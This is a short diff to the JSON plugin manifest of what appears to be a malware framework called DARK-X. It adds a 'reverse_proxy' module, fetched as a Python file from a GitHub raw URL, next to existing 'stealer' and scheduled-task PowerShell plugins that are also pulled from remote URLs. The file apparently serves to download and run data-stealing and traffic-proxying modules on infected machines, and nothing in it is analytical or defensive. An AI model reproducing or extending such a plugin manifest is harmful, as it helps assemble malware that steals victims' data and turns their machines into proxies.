@@ -15,6 +15,10 @@
 		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/Scheduled.ps1",
 		"Extention" : "PS1"
 	},
+	"reverse_proxy": {
+		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/reverse_proxy.py",
+		"Extention" : "Py"
+	},
 	"stealer": {
 		"Url" : "https://raw.githubusercontent.com/UQABXO/DARK-X/main/Plugins/Stealer.py",
 		"Extention" : "Py"
